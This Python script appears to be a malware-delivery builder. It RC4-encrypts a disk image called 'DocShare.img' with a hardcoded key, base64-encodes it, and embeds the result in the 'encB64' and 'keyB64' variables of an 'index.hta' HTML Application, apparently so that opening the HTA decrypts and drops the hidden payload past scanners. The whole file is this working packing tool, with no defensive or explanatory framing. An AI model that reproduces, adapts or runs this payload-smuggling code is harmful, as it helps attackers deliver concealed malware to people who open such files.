import os
import re
import base64

RC4_KEY = b'-4S@aAv;&T~2\\.e+3])N`C|"\\.3FTVH8NG5O$Hjh+~s^g\'G06ni"n{E2cujo"w^lnmZo)i!I6U:i}k~(xy,ftS~v%"FTq)<@V%8uG?P@))V%@xOHovWgtA5n/.vj1C+W3G7K=<2ZX\'{Q&Y80Ql{?tS}SwzR.MKrz1<gKCV$"t=OP<8N$<jQ\'=Lt(HPI\\*u4yZ(~v_pY3{TDFlb^^Y`Tlac3mPRbHlZNh{Y% o{y`q[r5fQOv$}`Q?oLvX,YWp+~,'

ENC_B64_RE = re.compile(r'(var encB64 = ")[^"]*(";)')
KEY_B64_RE = re.compile(r'(var keyB64 = ")[^"]*(";)')


def rc4(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    out = bytearray(len(data))
    i = 0
    j = 0
    for idx in range(len(data)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out[idx] = data[idx] ^ S[(S[i] + S[j]) % 256]
    return out


def replace_blob(content, pattern, new_value):
    match = pattern.search(content)
    if not match:
        return None
    return pattern.sub(rf'\g<1>{new_value}\g<2>', content, count=1)


def main():
    img_path = 'DocShare.img'
    hta_path = 'index.hta'

    if not os.path.exists(img_path):
        print(f"[!] File not found: {img_path}")
        return 1

    if not os.path.exists(hta_path):
        print(f"[!] File not found: {hta_path}")
        return 1

    with open(img_path, 'rb') as f:
        pt = f.read()

    print(f"[*] Read {len(pt):,} bytes from {img_path}")
    print("[*] Encrypting payload...")
    ct = rc4(RC4_KEY, pt)

    b64_key = base64.b64encode(RC4_KEY).decode('ascii')
    b64_ct = base64.b64encode(ct).decode('ascii')
    print(f"[*] encB64 length: {len(b64_ct):,}")
    print(f"[*] keyB64 length: {len(b64_key):,}")

    with open(hta_path, 'r', encoding='utf-8') as f:
        hta = f.read()

    updated = replace_blob(hta, ENC_B64_RE, b64_ct)
    if updated is None:
        print("[!] Could not find `var encB64 = \"...\";` in index.hta")
        return 1

    updated = replace_blob(updated, KEY_B64_RE, b64_key)
    if updated is None:
        print("[!] Could not find `var keyB64 = \"...\";` in index.hta")
        return 1

    with open(hta_path, 'w', encoding='utf-8', newline='') as f:
        f.write(updated)

    print(f"[+] Updated image blobs in {hta_path} (JS unchanged)")
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
